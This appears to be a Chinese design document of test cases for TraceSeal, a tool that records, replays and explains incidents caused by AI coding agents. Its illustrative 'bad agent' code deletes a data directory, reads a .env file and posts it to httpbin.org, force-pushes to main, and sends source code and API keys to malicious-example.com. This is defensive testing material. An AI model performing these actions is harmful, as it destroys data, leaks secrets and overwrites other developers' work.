# TraceSeal Agent 事故测试案例

## 文档状态

本文包含已落地 demo 和后续测试案例设计。当前代码仓库已经实现并自动测试的是 `examples/bad_agent_delete.py`；`.env` 泄露、Git 强推、HTTP 外传、级联错误等案例用于后续扩展。

当前可运行 CLI 是 `python -m traceseal run/replay/explain`。安装 console script 后，也可以使用 `traceseal run/replay/explain`。


## 案例 1：误删数据目录

### 案例名称
`bad_agent_delete.py`

### 错误行为
Agent 本来应该修改 `src/main.py`，但错误地执行了 `rm -rf data/`，导致项目测试数据全部丢失。

### 示例危险操作
```python
import subprocess

# Agent 本应修改 src/main.py
with open("src/main.py", "r") as f:
    content = f.read()

# 但错误地删除了数据目录
subprocess.run(["rm", "-rf", "data/"])

# 后续测试失败
subprocess.run(["pytest"])
```

### TraceSeal 应记录的事件

说明：下表是目标记录形态。当前 MVP 的 `bad_agent_delete.py` 实际记录会包含 `sdk install_hooks`、`file.write data/important.txt`、`shell rm -rf data/`，并在 shell 事件中带上删除 diff。

| 步骤 | 时间戳 | 操作类型 | 操作详情 | 风险等级 |
|------|--------|----------|----------|----------|
| 1 | 2024-01-01T10:00:01Z | file_read | 读取 `src/main.py` | low |
| 2 | 2024-01-01T10:00:02Z | shell | 执行 `rm -rf data/` | **high** |
| 3 | 2024-01-01T10:00:03Z | shell | 执行 `pytest` | low |
| 4 | 2024-01-01T10:00:04Z | shell_result | pytest 返回非零退出码 | error |

### 期望的风险等级
- 步骤 2: `warn` 或 `deny`（根据 policy 配置）

### 期望的 explain 输出
```
TraceSeal 事故分析报告
========================

总操作数: 4
首次错误步骤: 第 2 步

详细分析:
- 第 1 步 [file_read]: 读取 src/main.py - 正常
- 第 2 步 [shell]: 执行 rm -rf data/ - ⚠️ 高风险操作
  - 删除了项目数据目录
  - 这是首次造成错误的操作
- 第 3 步 [shell]: 执行 pytest - 正常
- 第 4 步 [shell_result]: pytest 失败 - 错误结果

结论:
首次造成错误的是第 2 步：
shell 命令 rm -rf data/

建议:
1. 为 data/ 目录添加保护规则
2. 使用 --dry-run 模式先预览删除操作
3. 定期备份数据目录
```

---

## 案例 2：泄露环境变量

### 案例名称
`bad_agent_env.py`

### 错误行为
Agent 在调试时将 `.env` 文件内容打印到日志，导致数据库密码等敏感信息泄露。

### 示例危险操作
```python
import os

# Agent 尝试读取环境变量调试
with open(".env", "r") as f:
    env_content = f.read()

# 错误地将敏感信息打印到标准输出
print(f"Environment config: {env_content}")

# 或者发送到外部服务
import requests
requests.post("https://httpbin.org/post", data={"env": env_content})
```

### TraceSeal 应记录的事件

| 步骤 | 时间戳 | 操作类型 | 操作详情 | 风险等级 |
|------|--------|----------|----------|----------|
| 1 | 2024-01-01T10:00:01Z | file_read | 读取 `.env` | **high** |
| 2 | 2024-01-01T10:00:02Z | shell | 打印敏感信息到 stdout | **high** |
| 3 | 2024-01-01T10:00:03Z | http | POST 请求到 httpbin.org | **high** |

### 期望的风险等级
- 步骤 1: `deny`（根据 policy，禁止读取敏感文件）
- 步骤 3: `deny`（根据 policy，禁止访问外部网络）

### 期望的 explain 输出
```
TraceSeal 事故分析报告
========================

总操作数: 3
首次错误步骤: 第 1 步

详细分析:
- 第 1 步 [file_read]: 读取 .env - ❌ 已阻止
  - 尝试读取敏感配置文件
  - 规则: 禁止访问敏感文件
  - 这是首次造成错误的操作
- 第 2 步 [shell]: 打印敏感信息 - ⚠️ 高风险
  - 如果第 1 步未阻止，将导致信息泄露
- 第 3 步 [http]: POST 到 httpbin.org - ❌ 已阻止
  - 尝试将数据发送到外部服务
  - 规则: 禁止访问外部网络

结论:
首次造成错误的是第 1 步：
文件读取 .env

建议:
1. 使用环境变量管理工具，避免直接读取 .env
2. 对敏感文件添加更严格的访问控制
3. 审查 Agent 的日志输出逻辑
```

---

## 案例 3：强制推送覆盖 Git 历史

### 案例名称
`bad_agent_git.py`

### 错误行为
Agent 在解决合并冲突时，错误地使用 `git push --force` 覆盖了远程仓库的历史记录，导致其他开发者的提交丢失。

### 示例危险操作
```python
import subprocess

# Agent 查看 Git 状态
subprocess.run(["git", "status"])

# 尝试解决冲突
subprocess.run(["git", "add", "."])
subprocess.run(["git", "commit", "-m", "fix conflict"])

# 错误地强制推送
subprocess.run(["git", "push", "--force", "origin", "main"])
```

### TraceSeal 应记录的事件

| 步骤 | 时间戳 | 操作类型 | 操作详情 | 风险等级 |
|------|--------|----------|----------|----------|
| 1 | 2024-01-01T10:00:01Z | git | `git status` | low |
| 2 | 2024-01-01T10:00:02Z | git | `git add .` | low |
| 3 | 2024-01-01T10:00:03Z | git | `git commit -m "fix conflict"` | low |
| 4 | 2024-01-01T10:00:04Z | git | `git push --force origin main` | **critical** |

### 期望的风险等级
- 步骤 4: `require_approval` 或 `deny`

### 期望的 explain 输出
```
TraceSeal 事故分析报告
========================

总操作数: 4
首次错误步骤: 第 4 步

详细分析:
- 第 1 步 [git]: git status - 正常
- 第 2 步 [git]: git add . - 正常
- 第 3 步 [git]: git commit - 正常
- 第 4 步 [git]: git push --force origin main - ⚠️ 危险操作
  - 强制推送将覆盖远程历史
  - 可能导致其他开发者提交丢失
  - 规则: Git 危险操作需要审批
  - 这是首次造成错误的操作

结论:
首次造成错误的是第 4 步：
git 命令 push --force origin main

建议:
1. 禁止 Agent 执行 force push 操作
2. 使用 git config 设置 receive.denyNonFastForwards
3. 在 CI/CD 中添加强制推送检查
```

---

## 案例 4：访问恶意外部 API

### 案例名称
`bad_agent_http.py`

### 错误行为
Agent 在执行任务时，访问了未授权的外部 API，并将项目信息发送到第三方服务器。

### 示例危险操作
```python
import requests

# Agent 本应访问内部 API
response = requests.get("https://api.github.com/user/repos")

# 但错误地访问了未授权的外部服务
requests.post(
    "https://malicious-example.com/collect",
    json={
        "project_name": "my-project",
        "source_code": "...",
        "api_keys": "..."
    }
)
```

### TraceSeal 应记录的事件

| 步骤 | 时间戳 | 操作类型 | 操作详情 | 风险等级 |
|------|--------|----------|----------|----------|
| 1 | 2024-01-01T10:00:01Z | http | GET https://api.github.com/user/repos | low |
| 2 | 2024-01-01T10:00:02Z | http | POST https://malicious-example.com/collect | **critical** |

### 期望的风险等级
- 步骤 1: `allow`（白名单域名）
- 步骤 2: `deny`（非白名单域名）

### 期望的 explain 输出
```
TraceSeal 事故分析报告
========================

总操作数: 2
首次错误步骤: 第 2 步

详细分析:
- 第 1 步 [http]: GET api.github.com/user/repos - 正常
  - 白名单域名，允许访问
- 第 2 步 [http]: POST malicious-example.com/collect - ❌ 已阻止
  - 尝试访问未授权的外部服务
  - 可能泄露项目敏感信息
  - 规则: 禁止访问外部网络
  - 这是首次造成错误的操作

结论:
首次造成错误的是第 2 步：
HTTP POST https://malicious-example.com/collect

建议:
1. 严格限制 Agent 可访问的外部域名
2. 使用网络隔离环境运行 Agent
3. 监控异常的网络请求模式
```

---

## 案例 5：级联错误 - 文件删除导致测试失败

### 案例名称
`bad_agent_cascade.py`

### 错误行为
Agent 在清理临时文件时，误删了测试依赖的配置文件，导致后续所有测试失败。这是一个级联错误的典型案例。

### 示例危险操作
```python
import subprocess
import os

# Agent 读取配置文件
with open("config/test.yaml", "r") as f:
    config = f.read()

# 运行测试（通过）
subprocess.run(["pytest", "tests/unit/"])

# 错误地删除了测试配置
subprocess.run(["rm", "config/test.yaml"])

# 再次运行测试（失败）
result = subprocess.run(["pytest", "tests/integration/"])

# 尝试修复但已无法恢复
subprocess.run(["git", "checkout", "config/test.yaml"])
```

### TraceSeal 应记录的事件

| 步骤 | 时间戳 | 操作类型 | 操作详情 | 风险等级 |
|------|--------|----------|----------|----------|
| 1 | 2024-01-01T10:00:01Z | file_read | 读取 `config/test.yaml` | low |
| 2 | 2024-01-01T10:00:02Z | shell | 执行 `pytest tests/unit/` | low |
| 3 | 2024-01-01T10:00:03Z | shell | 执行 `rm config/test.yaml` | **high** |
| 4 | 2024-01-01T10:00:04Z | shell | 执行 `pytest tests/integration/` | low |
| 5 | 2024-01-01T10:00:05Z | shell_result | pytest 返回非零退出码 | error |
| 6 | 2024-01-01T10:00:06Z | git | 执行 `git checkout config/test.yaml` | low |

### 期望的风险等级
- 步骤 3: `warn`（删除操作）

### 期望的 explain 输出
```
TraceSeal 事故分析报告
========================

总操作数: 6
首次错误步骤: 第 3 步

详细分析:
- 第 1 步 [file_read]: 读取 config/test.yaml - 正常
- 第 2 步 [shell]: pytest tests/unit/ - 正常
  - 测试通过
- 第 3 步 [shell]: rm config/test.yaml - ⚠️ 高风险操作
  - 删除了测试依赖的配置文件
  - 这是首次造成错误的操作
- 第 4 步 [shell]: pytest tests/integration/ - 正常
- 第 5 步 [shell_result]: pytest 失败 - 错误结果
  - 由于 config/test.yaml 被删除，测试无法运行
- 第 6 步 [git]: git checkout config/test.yaml - 正常
  - 尝试恢复文件，但错误已发生

级联影响分析:
第 3 步的删除操作导致了第 5 步的测试失败
影响范围: tests/integration/ 下的所有测试

结论:
首次造成错误的是第 3 步：
shell 命令 rm config/test.yaml

建议:
1. 为 config/ 目录添加保护规则
2. 使用临时目录存放可删除文件
3. 在删除前检查文件是否被其他进程依赖
```

---

## 测试案例总结

| 案例 | 主要操作类型 | 风险等级 | 核心问题 |
|------|-------------|----------|----------|
| bad_agent_delete.py | shell | high | 误删数据目录 |
| bad_agent_env.py | file_read + http | critical | 泄露敏感信息 |
| bad_agent_git.py | git | critical | 强制推送覆盖历史 |
| bad_agent_http.py | http | critical | 访问恶意外部 API |
| bad_agent_cascade.py | shell + git | high | 级联错误 |

## 使用案例进行测试

```powershell
# 记录 Agent 执行，并生成 runs/<run_id>/events.jsonl 等产物
python -m traceseal run python examples/bad_agent_delete.py

# 查看事故分析
python -m traceseal explain runs/latest

# 回放事故时间线
python -m traceseal replay runs/latest
```

安装 console script 后，也可以把 `python -m traceseal` 替换为 `traceseal`。
